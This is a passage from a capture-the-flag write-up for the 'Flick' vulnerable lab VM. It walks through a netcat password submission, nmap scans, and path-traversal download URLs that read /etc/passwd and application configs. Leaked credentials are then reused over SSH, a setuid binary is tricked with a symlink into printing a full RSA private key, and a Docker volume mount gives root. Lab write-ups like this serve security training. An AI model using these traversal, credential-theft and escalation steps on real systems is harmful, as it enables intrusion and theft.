AAAAAAAAAAAAAAAAAAAAAAAAAA
......
......

```

we find server will split string with buffer size 1024. Now, we can't exploit server with large strings.  
And we login with the string 'tabupJievas8Knoj' from port 22.  

```
lab:pentestlab/ $ python2 -c 'print "tabupJievas8Knoj"' | ncat -v 192.168.10.42 8881
Ncat: Version 6.47 ( http://nmap.org/ncat )
Ncat: Connected to 192.168.10.42:8881.
Welcome to the admin server. A correct password will 'flick' the switch and open a new door:
> OK: tabupJievas8Knoj

Accepted! The door should be open now :poolparty:

> 

```

scan open port(s) again.  

```
lab:pentestlab/ $ nmap -v -n -T4 -p- 192.168.10.42 

Starting Nmap 6.47 ( http://nmap.org ) at 2015-07-20 15:34 UTC
Initiating Ping Scan at 15:34
Scanning 192.168.10.42 [2 ports]
Completed Ping Scan at 15:34, 0.00s elapsed (1 total hosts)
Initiating Connect Scan at 15:34
Scanning 192.168.10.42 [65535 ports]
Discovered open port 22/tcp on 192.168.10.42
Discovered open port 80/tcp on 192.168.10.42
Discovered open port 8881/tcp on 192.168.10.42
Completed Connect Scan at 15:34, 1.77s elapsed (65535 total ports)
Nmap scan report for 192.168.10.42
Host is up (0.0072s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8881/tcp open  unknown

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.86 seconds
```

###Port: 80###


access to http://192.168.10.42/404, we can get:

```
http://192.168.10.42/db/  
http://192.168.10.42/scripts/  
http://192.168.10.42/web/  
http://192.168.10.42/icons/  
http://192.168.10.42/cgi-bin/  
http://192.168.10.42/image/view  
http://192.168.10.42/image/download  
```

You have to be logged in to download photos.  

```
http://192.168.10.42/image/download?filename=....//....//etc/passwd  
http://192.168.10.42/image/download?filename=....//....//....//....//etc/apache2/sites-enabled/000-default  
http://192.168.10.42/image/download?filename=....//....//....//....//var/www/flick_photos/public/index.php
http://192.168.10.42/image/download?filename=....//....//....//....//var/www/flick_photos/bootstrap/autoload.php
http://192.168.10.42/image/download?filename=....//....//....//....//var/www/flick_photos/vendor/autoload.php
http://192.168.10.42/image/download?filename=....//....//....//....//var/www/flick_photos/vendor/composer/ClassLoader.php
http://192.168.10.42/image/download?filename=....//....//....//....//var/www/flick_photos/app/config/database.php
```

view **/etc/apache2/sites-enabled/000-default**, we can get:  

```
    DocumentRoot /var/www/flick_photos/public
    <Directory />
        Options FollowSymLinks
        AllowOverride None
    </Directory>
    <Directory /var/www/flick_photos/public>
        Options Indexes FollowSymLinks MultiViews
        AllowOverride All
        Order allow,deny
        allow from all
    </Directory>

```
view **/etc/passwd**, we can get:   

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
messagebus:x:102:105::/var/run/dbus:/bin/false
whoopsie:x:103:106::/nonexistent:/bin/false
landscape:x:104:109::/var/lib/landscape:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
robin:x:1000:1000:robin,,,:/home/robin:/bin/bash
mysql:x:106:114:MySQL Server,,,:/nonexistent:/bin/false
dean:x:1001:1001:,,,:/home/dean:/bin/bash
```
view **/var/www/flick_photos/app/config/database.php**, we can get:  

```
    'connections' => array(
      
        'sqlite' => array(
            'driver'   => 'sqlite',
            'database' => __DIR__.'/../database/production.sqlite', // OLD DATABASE NO LONGER IN USE!
            'prefix'   => '',
        ), 
      
        'mysql' => array(
            'driver'    => 'mysql',
            'host'      => 'localhost',
            'database'  => 'flick',
            'username'  => 'flick',
            'password'  => 'resuddecNeydmar3',
            'charset'   => 'utf8',
            'collation' => 'utf8_unicode_ci',
            'prefix'    => '',
        ), 
      
        'pgsql' => array(
            'driver'   => 'pgsql',
            'host'     => 'localhost',
            'database' => 'forge',
            'username' => 'forge',
            'password' => '',
            'charset'  => 'utf8',
            'prefix'   => '',
            'schema'   => 'public',
        ), 
        
        'sqlsrv' => array(
            'driver'   => 'sqlsrv',
            'host'     => 'localhost',
            'database' => 'database',
            'username' => 'root',
            'password' => '',
            'prefix'   => '',
        ),
      
    ),    

    'redis' => array(
     
        'cluster' => false,
     
        'default' => array(
            'host'     => '127.0.0.1',
            'port'     => 6379,
            'database' => 0,
        ),
     
    ),

```

access **http://192.168.10.42/image/download?filename=....//....//....//....//var/www/flick_photos/app/database/production.sqlite**, and download sqlite database.


```
lab:flick/ $ sqlite3 production.sqlite 
SQLite version 3.8.10.2 2015-05-20 18:17:19
Enter ".help" for usage hints.
sqlite> .databases
Error: file is encrypted or is not a database
lab:flick/ $ file production.sqlite 
production.sqlite: SQLite 2.x database
```

```
sqlite> .tables
old_users
sqlite> .dump old_users
BEGIN TRANSACTION;
CREATE TABLE old_users (
  username text,
  password text
);
INSERT INTO old_users VALUES('paul','nejEvOibKugEdof0KebinAw6TogsacPayarkOctIasejbon7Ni7Grocmyalkukvi');
INSERT INTO old_users VALUES('robin','JoofimOwEakpalv4Jijyiat5GloonTojatticEirracksIg4yijovyirtAwUjad1');
INSERT INTO old_users VALUES('james','scujittyukIjwip0zicjoocAnIltAsh4Vuer4osDidsaiWipOkDunipownIrtOb5');
INSERT INTO old_users VALUES('dean','FumKivcenfodErk0Chezauggyokyait5fojEpCayclEcyaj2heTwef0OlNiphAnA');
COMMIT;

```

we can connect to host with SSH with **robin** and **dean**. dean can login it successfully.

```
 .o88o. oooo   o8o            oooo        
 888 `" `888   `"'            `888        
o888oo   888  oooo   .ooooo.   888  oooo  
 888     888  `888  d88' `"Y8  888 .8P'   
 888     888   888  888        888888.    
 888     888   888  888   .o8  888 `88b.  
o888o   o888o o888o `Y8bod8P' o888o o888o 
                                          

dean@192.168.10.42's password: 
Welcome to Ubuntu 12.04.4 LTS (GNU/Linux 3.11.0-15-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

  System information as of Tue Jul 21 10:20:28 SAST 2015

  System load:  0.0               Processes:              87
  Usage of /:   36.0% of 6.99GB   Users logged in:        0
  Memory usage: 50%               IP address for eth0:    192.168.10.42
  Swap usage:   0%                IP address for docker0: 172.17.42.1

  Graph this data and manage this system at:
    https://landscape.canonical.com/

New release '14.04.2 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Sat Aug  2 14:42:15 2014 from 192.168.56.1
dean@flick:~$ 
dean@flick:~$ ls -l /var/www/
flick_photos/ index.php     
dean@flick:~$ ls -l /var/www/flick_photos/
total 100
drwxr-xr-x 12 www-data www-data  4096 Aug  1  2014 app
-rw-r--r--  1 www-data www-data  2452 Aug  1  2014 artisan
drwxr-xr-x  2 www-data www-data  4096 Aug  1  2014 bootstrap
-rw-r--r--  1 www-data www-data   697 Aug  1  2014 composer.json
-rw-r--r--  1 www-data www-data 59423 Aug  1  2014 composer.lock
-rw-r--r--  1 www-data www-data   146 Aug  1  2014 CONTRIBUTING.md
-rw-r--r--  1 www-data www-data   567 Aug  1  2014 phpunit.xml
drwxr-xr-x  7 www-data www-data  4096 Aug  1  2014 public
-rw-r--r--  1 www-data www-data  2051 Aug  1  2014 readme.md
-rw-r--r--  1 www-data www-data   519 Aug  1  2014 server.php
drwxr-xr-x 20 www-data www-data  4096 Aug  1  2014 vendor
```

----

###docker####

```
dean@flick:~$ ./read_docker /home/robin/flick-dev/
# Flick-a-photo dev env
RUN apt-get update && apt-get install -y php5 libapache2-mod-php5 php5-mysql php5-cli && apt-get clean && rm -rf /var/lib/apt/lists/*

CMD ["/usr/sbin/apache2", "-D", "FOREGROUND"]
```

```
dean@flick:~$ ln -s /home/robin/.ssh/id_rsa Dockerfile
dean@flick:~$ ls -l
total 36
lrwxrwxrwx 1 dean  dean    23 Jul 21 11:16 Dockerfile -> /home/robin/.ssh/id_rsa
-rw-r--r-- 1 root  root  1250 Aug  4  2014 message.txt
-rwsr-xr-x 1 robin robin 8987 Aug  4  2014 read_docker
dean@flick:~$ ./read_docker /home/dean/
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAlv/0uKdHFQ4oT06Kp3yg0tL1fFVl4H+iS1UOqds0HrgBCTSw
ECwVwhrIFJa/u5FOPGst8t35CKo4VWX3KNHXFNVtUXWeQFpe/rB/0wi+k8E8WtXi
FBjLiFOqTDL0kgXRoQzUPlYg0+LAXo5EbMq+rB2ZgMJTxunJFV2m+uKtbZZRvzU6
S1Fj6XHh/U0E68d6sZ/+y1UhSJLaFYUQMkfLtjxPa17sPZ+kwB1R4puhVTprfQOk
CinfW01ot2Rj2HLMR5CpgA28dmxw8W6w0MGtXurTegj1ydFOTgB1/k4XpXnSGNO9
d2AlVR/NsKDAuYKdgRGFFh91nGZTl1p4em48YwIDAQABAoIBADI3bwhVwSL0cV1m
jmAC520VcURnFhlh+PQ6lkTQvHWW1elc10yZjKbfxzhppdvYB/+52S8SuPYzvcZQ
wbCWkIPCMrfLeNSH+V2UDv58wvxaYBsJVEVAtbdhs5nhvEovmzaHELKmbAZrO3R2
tbTEfEK7GUij176oExKC8bwv1GND/qQBwLtEJj/YVJSsdvrwroCde+/oJHJ76ix4
Ty8sY5rhKYih875Gx+7IZNPSDn45RsnlORm8fd5EGLML6Vm3iLfwkHIxRdj9DFoJ
wJcPX7ZWTsmyJLwoHe3XKklz2KW185hIr9M2blMgrPC2ZuTnvBXmEWuy86+xxAB0
mFXYMdkCgYEAx6yab3huUTgTwReaVpysUEqy4c5nBLKqs6eRjVyC9jchQfOqo5AQ
l8bd6Xdrk0lvXnVkZK0vw2zwqlk8N/vnZjfWnCa4unnv2CZXS9DLaeU6gRgRQFBI
JB+zHyhus+ill4aWHitcEXiBEjUHx4roC7Al/+tr//cjwUCwlHk75F0CgYEAwZhZ
gBjAo9X+/oFmYlgVebfR3kLCD4pVPMz+HyGCyjSj0+ddsHkYiHBhstBtHh9vU+Pn
JMhrtR9yzXukuyQr/ns1mhEQOUtTaXrsy/1FyRBaISrtcyGAruu5yWubT0gXk2Dq
rwyb6M6MbnwEMZr2mSBU5l27cTKypFqgcA58l78CgYAWM5vsXxCtGTYhFzXDAaKr
PtMLBn8v54nRdgVaGXo6VEDva1+C1kbyCVutVOjyNI0cjKMACr2v1hIgbtGiS/Eb
zYOgUzHhEiPX/dNhC7NCcAmERx/L7eFHmvq4sS81891NrtpMOnf/PU3kr17REiHh
AtIG1a9pg5pHJ6E6sQw2xQKBgHXeqm+BopieDFkstAeglcK8Fr16a+lGUktojDis
EJPIpQ65yaNOt48qzXEv0aALh57OHceZd2qZsS5G369JgLe6kJIzXWtk325Td6Vj
mX+nwxh6qIP2nADkaQOnzrHgtOn4kiruRGbki0AhpfQF46qrssVnwF5Vfcrvmstf
JqDFAoGBAI9KJamhco8BBka0PUWgJ3R2ZqE1viTvyME1G25h7tJb17cIeB/PeTS1
Q9KMFl61gpl0J4rJEIakeGpXuehwYAzNBv7n6yr8CNDNkET/cVhp+LCmbS91FwAK
VP0mqDppzOZ04B9FQD8Af6kUzxzGFH8tAN5SNYSW88I9Z8lVpfkn
-----END RSA PRIVATE KEY-----

```

```
dean@flick:~$ ssh -i ~/.ssh/id_rsa robin@192.168.10.42
```

```
robin@flick:~$ docker run ubuntu ls -l /home
total 0
robin@flick:~$ docker run ubuntu ls -l /root
total 0
robin@flick:~$ docker run -t -i -v /root:/root ubuntu /bin/bash
root@a86a88c8f91b:/# ls -l /root/
total 8
drwxr-xr-x 2 root root 4096 Aug  1  2014 53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc
-rw-r--r-- 1 root root   67 Aug  1  2014 flag.txt
root@a86a88c8f91b:/# cat /root/flag.txt 
Errr, you are close, but this is not the flag you are looking for.
root@a86a88c8f91b:/# cat /root/53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc/real_flag.txt 
Congrats!

You have completed 'flick'! I hope you have enjoyed doing it as much as I did creating it :)

ciao for now!
@leonjza
root@a86a88c8f91b:/# 
```



----

##References##

- 9 Feb 2015 - [Pentest lab - Flick](https://chousensha.github.io/blog/2015/02/09/pentest-lab-flick/) (chousensha)
- 8 Oct 2014 - [Flick Challenge](http://resources.infosecinstitute.com/flick-challenge/) (Infosec Institute)
- 12 Sep 2014 - [Quick tricks to beat the Flick](http://stealthsploit.com/2014/09/12/quick-tricks-to-beat-the-flick/) (ChP4wned)
- 17 Aug 2014 - [Vulnhub Flick VM Writeup](http://shieldsec.com/pentest/vulnhub-flick-vm-writeup/) (Captain-Fungi)
- 16 Aug 2014 - [Flick: 1](http://rastamouse.me/blog/2014/flick-1/) (Rasta Mouse)
- 14 Aug 2014 - [Flick Hacking Challenge](http://blog.techorganic.com/2014/08/14/flick-hacking-challenge/) (superkojiman)
- 13 Aug 2014 - [Flick Vulnerable VM](http://drxpsec-drxp.rhcloud.com/2014/08/13/flick-vulnerable-vm/) (drxp)
- 13 Aug 2014 - [How Many Hackers Does It Take to Change a Lightbulb ?](http://fourfourfourfour.co/2014/08/13/how-many-hackers-does-it-take-to-change-a-lightbulb/) (recrudesce)

